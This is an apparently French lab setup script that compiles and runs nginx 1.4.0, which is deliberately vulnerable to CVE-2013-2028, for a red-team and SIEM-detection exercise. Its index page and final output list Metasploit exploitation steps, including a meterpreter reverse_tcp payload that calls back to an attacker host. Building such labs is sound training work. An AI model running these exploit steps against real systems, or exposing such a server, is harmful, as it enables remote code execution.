#!/bin/bash

###############################################################################
# Script d'installation nginx 1.4.0 VULN√âRABLE sur port 8080
# Projet: Iron4Software Red Team Lab
# Patch: sys/sysctl.h pour compatibilit√© Ubuntu 24.04
###############################################################################

set -e  # Arr√™t en cas d'erreur

echo "=================================================="
echo "Installation nginx 1.4.0 VULN√âRABLE - Port 8080"
echo "Version EXPLOITABLE avec patch Ubuntu 24.04"
echo "=================================================="
echo ""

# V√©rifier qu'on est root
if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Ce script doit √™tre ex√©cut√© en tant que root (sudo)"
    exit 1
fi

# 1. Installation des d√©pendances
echo "[1/11] Installation des d√©pendances..."
apt update -qq
apt install -y build-essential libpcre3-dev libssl-dev zlib1g-dev wget curl > /dev/null 2>&1
echo "‚úÖ D√©pendances install√©es"

# 2. T√©l√©chargement de nginx 1.4.0
echo "[2/11] T√©l√©chargement de nginx 1.4.0..."
cd /tmp
if [ -f "nginx-1.4.0.tar.gz" ]; then
    rm -f nginx-1.4.0.tar.gz
fi
if [ -d "nginx-1.4.0" ]; then
    rm -rf nginx-1.4.0
fi
wget -q http://nginx.org/download/nginx-1.4.0.tar.gz
tar -xzf nginx-1.4.0.tar.gz
echo "‚úÖ nginx 1.4.0 t√©l√©charg√©"

# 3. PATCH pour Ubuntu 24.04 (kernel 6.x)
echo "[3/11] Application du patch sys/sysctl.h..."
cd nginx-1.4.0

# Commenter la ligne #include <sys/sysctl.h> qui n'existe plus
sed -i 's/^#include <sys\/sysctl.h>/\/\/ #include <sys\/sysctl.h> \/\/ Patched for modern kernel/' src/os/unix/ngx_linux_config.h

# V√©rifier que le patch est appliqu√©
if grep -q "// #include <sys/sysctl.h>" src/os/unix/ngx_linux_config.h; then
    echo "‚úÖ Patch appliqu√© avec succ√®s"
else
    echo "‚ùå √âchec du patch"
    exit 1
fi

# 4. Configuration
echo "[4/11] Configuration de nginx 1.4.0..."
./configure \
    --prefix=/opt/nginx-vuln \
    --with-http_ssl_module \
    --with-http_stub_status_module \
    > /tmp/nginx-configure.log 2>&1

if [ $? -ne 0 ]; then
    echo "‚ùå Erreur lors de la configuration"
    cat /tmp/nginx-configure.log | tail -20
    exit 1
fi
echo "‚úÖ Configuration termin√©e"

# 5. Compilation
echo "[5/11] Compilation de nginx 1.4.0 (2-3 minutes)..."
echo "   ‚è≥ Compilation en cours, veuillez patienter..."

make > /tmp/nginx-make.log 2>&1 &
MAKE_PID=$!

# Spinner pendant compilation
spin='-\|/'
i=0
while kill -0 $MAKE_PID 2>/dev/null; do
    i=$(( (i+1) %4 ))
    printf "\r   ${spin:$i:1} Compilation... "
    sleep 0.3
done

wait $MAKE_PID
MAKE_EXIT=$?

if [ $MAKE_EXIT -ne 0 ]; then
    echo ""
    echo "‚ùå Erreur lors de la compilation"
    echo "Derni√®res lignes du log :"
    cat /tmp/nginx-make.log | tail -30
    exit 1
fi

echo ""
echo "‚úÖ nginx 1.4.0 compil√© avec succ√®s"

# Installation
make install > /dev/null 2>&1
echo "‚úÖ nginx 1.4.0 install√© dans /opt/nginx-vuln"

# 6. Cr√©ation du r√©pertoire web
echo "[6/11] Cr√©ation du r√©pertoire web..."
mkdir -p /var/www/vulnerable
chown -R www-data:www-data /var/www/vulnerable
echo "‚úÖ R√©pertoire /var/www/vulnerable cr√©√©"

# 7. Cr√©ation de la page d'index
echo "[7/11] Cr√©ation de la page d'index..."
cat > /var/www/vulnerable/index.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iron4Software - Vulnerable Server</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background: linear-gradient(135deg, #c31432 0%, #240b36 100%);
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
        }
        h1 {
            color: #c31432;
            border-bottom: 4px solid #c31432;
            padding-bottom: 15px;
        }
        .badge {
            display: inline-block;
            padding: 8px 16px;
            background: #c31432;
            color: white;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
            margin: 5px;
        }
        .danger {
            background: #ffe6e6;
            padding: 20px;
            border-left: 5px solid #c31432;
            margin: 25px 0;
            border-radius: 4px;
        }
        .vuln {
            background: #fff3cd;
            padding: 20px;
            border-left: 5px solid #ff9800;
            margin: 25px 0;
            border-radius: 4px;
        }
        code {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 3px 8px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        .exploit-list {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 4px;
            margin: 15px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ö†Ô∏è Iron4Software - Vulnerable Server</h1>
        
        <div>
            <span class="badge">nginx 1.4.0</span>
            <span class="badge">VULNERABLE</span>
            <span class="badge">Port 8080</span>
        </div>

        <div class="danger">
            <strong>üö® SERVEUR INTENTIONNELLEMENT VULN√âRABLE</strong><br><br>
            Ce serveur nginx 1.4.0 contient des vuln√©rabilit√©s connues et est destin√© UNIQUEMENT 
            √† des tests de p√©n√©tration en environnement contr√¥l√©.<br><br>
            <strong>NE JAMAIS exposer sur Internet !</strong>
        </div>

        <h2>üéØ Vuln√©rabilit√©s pr√©sentes</h2>
        <div class="exploit-list">
            <strong>CVE-2013-2028</strong> - nginx 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow<br>
            <em>Permet l'ex√©cution de code √† distance (RCE)</em><br><br>
            
            <strong>Exploit Metasploit :</strong><br>
            <code>exploit/linux/http/nginx_chunked_size</code>
        </div>

        <div class="vuln">
            <strong>üí° Informations d'exploitation :</strong>
            <ul>
                <li><strong>Version vuln√©rable :</strong> nginx/1.4.0</li>
                <li><strong>Port d'attaque :</strong> 8080</li>
                <li><strong>Target :</strong> Ubuntu 13.04 32bit - nginx 1.4.0</li>
                <li><strong>Payload :</strong> cmd/unix/python/meterpreter/reverse_tcp</li>
            </ul>
        </div>

        <h2>üìã Projet Iron4Software</h2>
        <p>
            Ce serveur fait partie du <strong>Red Team Lab Iron4Software</strong> pour 
            tester les capacit√©s de d√©tection du SIEM Splunk et valider les proc√©dures 
            de r√©ponse aux incidents.
        </p>

        <h2>üîó Endpoints</h2>
        <ul>
            <li><code>GET /</code> - Page d'accueil</li>
            <li><code>GET /status</code> - nginx stub_status</li>
        </ul>

        <h2>üõ°Ô∏è Techniques MITRE ATT&CK</h2>
        <ul>
            <li><strong>T1190</strong> - Exploit Public-Facing Application</li>
            <li><strong>T1068</strong> - Exploitation for Privilege Escalation</li>
            <li><strong>T1059</strong> - Command and Scripting Interpreter</li>
        </ul>

        <footer style="margin-top: 50px; text-align: center; color: #7f8c8d; border-top: 1px solid #ecf0f1; padding-top: 20px;">
            <strong>Iron4Software Lab Environment - 2026</strong><br>
            <em>Vulnerable by design - Educational purposes only</em>
        </footer>
    </div>
</body>
</html>
EOF
echo "‚úÖ Page d'index cr√©√©e"

# 8. Cr√©ation de la configuration nginx
echo "[8/11] Cr√©ation de la configuration nginx..."
cat > /opt/nginx-vuln/conf/nginx.conf << 'EOF'
user www-data;
worker_processes 1;

error_log /opt/nginx-vuln/logs/error.log;
pid /opt/nginx-vuln/logs/nginx.pid;

events {
    worker_connections 1024;
}

http {
    include mime.types;
    default_type application/octet-stream;

    access_log /opt/nginx-vuln/logs/access.log;

    sendfile on;
    keepalive_timeout 65;

    server {
        listen 8080;
        server_name mail.iron4software.local localhost;
        
        root /var/www/vulnerable;
        index index.html;

        location / {
            try_files $uri $uri/ =404;
        }

        location /status {
            stub_status on;
            access_log off;
        }
    }
}
EOF
echo "‚úÖ Configuration nginx cr√©√©e"

# 9. Cr√©ation des logs
echo "[9/11] Cr√©ation des r√©pertoires de logs..."
mkdir -p /opt/nginx-vuln/logs
chown -R www-data:www-data /opt/nginx-vuln/logs
echo "‚úÖ Logs configur√©s"

# 10. Test de la configuration
echo "[10/11] Test de la configuration..."
if /opt/nginx-vuln/sbin/nginx -t -c /opt/nginx-vuln/conf/nginx.conf > /dev/null 2>&1; then
    echo "‚úÖ Configuration valide"
else
    echo "‚ùå Configuration invalide"
    /opt/nginx-vuln/sbin/nginx -t -c /opt/nginx-vuln/conf/nginx.conf
    exit 1
fi

# 11. Service systemd
echo "[11/11] Cr√©ation du service systemd..."
cat > /etc/systemd/system/nginx-vuln.service << 'EOF'
[Unit]
Description=nginx 1.4.0 VULNERABLE instance on port 8080
After=network.target

[Service]
Type=forking
PIDFile=/opt/nginx-vuln/logs/nginx.pid
ExecStartPre=/opt/nginx-vuln/sbin/nginx -t -c /opt/nginx-vuln/conf/nginx.conf
ExecStart=/opt/nginx-vuln/sbin/nginx -c /opt/nginx-vuln/conf/nginx.conf
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s QUIT $MAINPID
PrivateTmp=true
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable nginx-vuln > /dev/null 2>&1
systemctl start nginx-vuln

sleep 2

if systemctl is-active --quiet nginx-vuln; then
    echo "‚úÖ Service d√©marr√©"
else
    echo "‚ùå √âchec d√©marrage"
    journalctl -u nginx-vuln -n 20 --no-pager
    exit 1
fi

# R√©sum√©
echo ""
echo "=================================================="
echo "üéâ nginx 1.4.0 VULN√âRABLE install√© !"
echo "=================================================="
echo ""

NGINX_VER=$(/opt/nginx-vuln/sbin/nginx -v 2>&1 | grep -oP 'nginx/\K[0-9.]+')
SERVER_IP=$(hostname -I | awk '{print $1}')

echo "üìä Serveur vuln√©rable op√©rationnel :"
echo "   Version       : nginx/${NGINX_VER}"
echo "   Port          : 8080"
echo "   IP            : ${SERVER_IP}"
echo "   CVE exploitable : CVE-2013-2028"
echo ""

# Test
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/ 2>/dev/null)

if [ "$HTTP_CODE" = "200" ]; then
    echo "‚úÖ Serveur accessible (HTTP 200)"
    echo ""
    echo "=================================================="
    echo "üî• EXPLOITATION AVEC METASPLOIT"
    echo "=================================================="
    echo ""
    echo "1. Configurer pfSense Port Forward :"
    echo "   Interface: KALI ‚Üí Port 8080 ‚Üí ${SERVER_IP}:8080"
    echo ""
    echo "2. Depuis Kali :"
    echo "   curl -I http://192.168.100.254:8080/"
    echo ""
    echo "3. Metasploit :"
    echo "   msfconsole -q"
    echo "   use exploit/linux/http/nginx_chunked_size"
    echo "   set RHOSTS 192.168.100.254"
    echo "   set RPORT 8080"
    echo "   set LHOST 192.168.100.10"
    echo "   set LPORT 4444"
    echo "   set target 4"
    echo "   check"
    echo "   exploit"
    echo ""
else
    echo "‚ùå Serveur ne r√©pond pas (HTTP ${HTTP_CODE})"
fi

echo "=================================================="
echo "‚ö†Ô∏è  SERVEUR VULN√âRABLE PR√äT POUR EXPLOITATION"
echo "=================================================="
